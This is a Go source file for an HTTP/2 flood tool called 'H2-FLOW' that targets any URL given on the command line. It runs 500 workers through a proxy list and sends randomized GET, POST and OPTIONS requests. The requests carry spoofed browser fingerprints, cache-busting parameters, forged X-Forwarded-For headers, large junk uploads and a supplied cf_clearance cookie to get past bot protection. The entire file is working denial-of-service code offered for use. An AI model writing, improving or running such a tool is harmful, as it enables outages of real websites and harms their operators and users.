package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	HAPUS          = "\033[0m"
	MERAH          = "\033[31m"
	IJO            = "\033[32m"
	PUTIH          = "\033[37m"
	CANDY          = "\033[91m"
	PUCAT          = "\033[38;5;203m"
	PUNYAMU        = "\033[38;5;204m"
	PUNYA_LU_PUCAT = "\033[38;5;218m"
	MASA_DEPAN_NYA = "\033[97m"
	Speed          = 500
	to             = 6 * time.Second
	MaxConcurrent  = 200
)

type FullProfile struct {
	UA           string
	Accept       string
	Lang         string
	Encoding     string
	SecChUa      string
	SecChUaMov   string
	SecChUaPlat  string
	SecFetchSite string
	SecFetchMode string
	SecFetchDest string
	Referer      string
	Origin       string
	DNT          string
}

var PFS = []FullProfile{
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "macOS",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?1",
		SecChUaPlat:  "Android",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.bing.com/search?q=",
		Origin:       "https://www.bing.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
}

var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}

type CLI struct {
	client *http.Client
	ip     string
}

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func RST(rng *rand.Rand, length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

var CCK string

func generateLargePayload(rng *rand.Rand, size int) ([]byte, string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", "payload.bin")
	part.Write(bytes.Repeat([]byte("X"), size))
	writer.Close()
	return body.Bytes(), writer.FormDataContentType()
}

func getAcceptLanguage(ua string) string {
	uaLower := strings.ToLower(ua)
	if strings.Contains(uaLower, "android") || strings.Contains(uaLower, "iphone") || strings.Contains(uaLower, "mobile") {
		return "id-ID,id;q=0.9,en-US;q=0.8"
	}
	return "en-US,en;q=0.9"
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Cara pakai: H2-FLOW.go <target> <duration> <cookie>")
		fmt.Println("Contoh: H2-FLOW.go https://target.com 60 \"cf_clearance=xxx\"")
		os.Exit(1)
	}
	tgt := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			dur = d
		}
	}
	if len(os.Args) >= 4 {
		CCK = os.Args[3]
	}
	parsed, _ := url.Parse(tgt)
	host := parsed.Hostname()
	if strings.HasPrefix(host, "www.") {
		host = host[4:]
	}

	var PRX []*url.URL
	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				PRX = append(PRX, p)
			}
		}
	}
	if len(PRX) == 0 {
		PRX = append(PRX, nil)
	}
	var proxyIPs []string
	for _, p := range PRX {
		if p != nil {
			proxyIPs = append(proxyIPs, p.Hostname())
		}
	}
	ipPool := proxyIPs
	if len(ipPool) == 0 {
		ipPool = []string{"127.0.0.1", "8.8.8.8", "1.1.1.1", "192.168.1.1", "10.0.0.1"}
	}

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	trBase := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:         200,
		MaxIdleConnsPerHost:  100,
		MaxConnsPerHost:      0,
		IdleConnTimeout:      300 * time.Second,
		TLSHandshakeTimeout:  3 * time.Second,
		ResponseHeaderTimeout: 2 * time.Second,
		ExpectContinueTimeout: 0,
		DisableKeepAlives:    false,
		DisableCompression:   false,
		ForceAttemptHTTP2:    true,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify:     true,
			NextProtos:             []string{"h2", "http/1.1"},
			SessionTicketsDisabled: false,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			},
		},
	}

	wcs := make([]CLI, len(PRX))
	for i, ProxyY := range PRX {
		tr := trBase.Clone()
		if ProxyY != nil {
			tr.Proxy = http.ProxyURL(ProxyY)
		}
		jar, _ := cookiejar.New(nil)
		client := &http.Client{
			Transport: tr,
			Timeout:   to,
			Jar:       jar,
		}
		wcs[i] = CLI{client: client, ip: ProxyY.Hostname()}
	}

	fmt.Printf("%s", MASA_DEPAN_NYA)
	fmt.Println("\n:::::::-.  :::::::::      .,~:::::    .:::.")
	fmt.Printf("%s", PUNYA_LU_PUCAT)
	fmt.Println(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.")
	fmt.Printf("%s", PUNYAMU)
	fmt.Println(" `[[     [[    .n[['    [[[          ''  ,['")
	fmt.Printf("%s", PUCAT)
	fmt.Println("  $$,    $$  ,$$P\" cccc $$$          .c$$P'")
	fmt.Printf("%s", MERAH)
	fmt.Println("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,")
	fmt.Printf("%s", CANDY)
	fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
	fmt.Printf("%s", HAPUS)
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)

	printInfo := func(label, value, status string) {
		if status != "" {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s %s[%s%s%s]\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS,
				MERAH, IJO, status, MERAH,
			)
		} else {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS)
		}
	}
	printInfo("Author", "Diz Flyze Ofc              ", "True")
	printInfo("Target", host, "")
	printInfo("Port  ", "443                        ", "True")
	printInfo("Method", "H2-FLOW                    ", "True")
	printInfo("Proxy ", fmt.Sprintf("%d                        ", len(PRX)), "True")
	printInfo("Worker", fmt.Sprintf("%d                       ", Speed), "True")
	printInfo("HTTP  ", "H2                         ", "True")
	if CCK != "" {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			IJO, HAPUS,
			PUTIH, HAPUS,
			MERAH, HAPUS,
			MERAH, IJO, "True", MERAH)
	} else {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			IJO, HAPUS,
			PUTIH, HAPUS,
			MERAH, HAPUS,
			PUTIH, IJO, "None", PUTIH)
	}
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)

	Start_Main := time.Now()
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				fmt.Printf("\r%*s\r", 80, "")
				return
			case <-ticker.C:
				elapsed := int(time.Since(Start_Main).Seconds())
				if elapsed > dur && dur > 0 {
					elapsed = dur
				}
				fmt.Printf("\r%s〇%s %sTime  %s %s:%s %s%02d/%ds%s                    %s[%s%s%s]\033[K",
					IJO, HAPUS,
					PUTIH, HAPUS,
					MERAH, HAPUS,
					PUTIH, elapsed, dur, HAPUS,
					MERAH, IJO, "True", MERAH)
			}
		}
	}()
	var wg sync.WaitGroup
	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() {
			cancel()
		})
	}

	sem := make(chan struct{}, MaxConcurrent)

	randPoolSize := 1000
	randStrPool := make([]string, randPoolSize)
	randIntPool := make([]int64, randPoolSize)
	for j := 0; j < randPoolSize; j++ {
		randStrPool[j] = RST(rand.New(rand.NewSource(time.Now().UnixNano()+int64(j))), 8)
		randIntPool[j] = rand.Int63()
	}
	ipHeaderNames := []string{"X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Client-IP"}

	for i := 0; i < Speed; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
			for ctx.Err() == nil {
				select {
				case sem <- struct{}{}:
				case <-ctx.Done():
					return
				}

				proxy := PRX[rng.Intn(len(PRX))]
				var cli CLI
				for _, c := range wcs {
					if (proxy == nil && c.ip == "") || (proxy != nil && c.ip == proxy.Hostname()) {
						cli = c
						break
					}
				}
				if cli.client == nil {
					cli = wcs[0]
				}

				methods := []string{"GET", "POST", "OPTIONS"}
				method := methods[rng.Intn(len(methods))]
				prof := PFS[rng.Intn(len(PFS))]
				ua := prof.UA
				acceptLang := getAcceptLanguage(ua)

				FORIP := ipPool[rng.Intn(len(ipPool))]
				realIP := cli.ip
				if realIP == "" {
					realIP = FORIP
				}

				path1 := randStrPool[rng.Intn(len(randStrPool))]
				path2 := randStrPool[rng.Intn(len(randStrPool))]
				baseURL := strings.TrimRight(tgt, "/")
				targetURL := baseURL + "/" + path1 + "/" + path2

				params := make([]string, 0, 4)
				for j := 0; j < 2+rng.Intn(2); j++ {
					key := CBP[rng.Intn(len(CBP))]
					val := strconv.FormatInt(randIntPool[rng.Intn(len(randIntPool))], 10)
					params = append(params, key+"="+val)
				}
				if strings.Contains(tgt, "?") {
					targetURL += "&" + strings.Join(params, "&")
				} else {
					targetURL += "?" + strings.Join(params, "&")
				}
				if rng.Intn(10) == 0 {
					targetURL += "&" + randStrPool[rng.Intn(len(randStrPool))] + "=" + randStrPool[rng.Intn(len(randStrPool))]
				}

				var body io.Reader
				contentType := ""
				if method == "POST" && rng.Intn(3) == 0 {
					payloadSize := 100000 + rng.Intn(500000)
					data, ctype := generateLargePayload(rng, payloadSize)
					body = bytes.NewReader(data)
					contentType = ctype
				} else if method == "POST" {
					body = strings.NewReader("")
				}

				req, _ := http.NewRequestWithContext(ctx, method, targetURL, body)

				req.Header.Set("User-Agent", ua)
				req.Header.Set("Accept", prof.Accept)
				req.Header.Set("Accept-Language", acceptLang)
				req.Header.Set("Accept-Encoding", prof.Encoding)
				req.Header.Set("Cache-Control", "no-cache, no-store")
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Upgrade-Insecure-Requests", "1")
				if prof.SecChUa != "" {
					req.Header.Set("Sec-Ch-Ua", prof.SecChUa)
					req.Header.Set("Sec-Ch-Ua-Mobile", prof.SecChUaMov)
					req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)
				}
				req.Header.Set("Sec-Fetch-Site", prof.SecFetchSite)
				req.Header.Set("Sec-Fetch-Mode", prof.SecFetchMode)
				req.Header.Set("Sec-Fetch-Dest", prof.SecFetchDest)
				if prof.Origin != "" {
					req.Header.Set("Origin", prof.Origin)
				}
				if prof.Referer != "" {
					req.Header.Set("Referer", prof.Referer)
				}
				if prof.DNT != "" {
					req.Header.Set("DNT", prof.DNT)
				}
				if method == "POST" {
					if contentType != "" {
						req.Header.Set("Content-Type", contentType)
					} else {
						req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
					}
				}

				if rng.Intn(3) == 0 {
					req.Header.Set("X-Forwarded-For", realIP)
					req.Header.Set("X-Real-IP", realIP)
				}
				if rng.Intn(3) == 0 {
					req.Header.Set(ipHeaderNames[rng.Intn(len(ipHeaderNames))], realIP)
				}

				var cookies []string
				if CCK != "" {
					cookies = append(cookies, CCK)
				}
				for _, name := range COOKIES {
					if rng.Intn(2) == 0 {
						cookies = append(cookies, name+"="+strconv.FormatInt(randIntPool[rng.Intn(len(randIntPool))], 16))
					}
				}
				if len(cookies) > 0 {
					req.Header.Set("Cookie", strings.Join(cookies, "; "))
				}

				resp, err := cli.client.Do(req)
				if err == nil {
					resp.Body.Close()
				}
				<-sem
			}
		}(i)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg.Wait()
	fmt.Println()
}
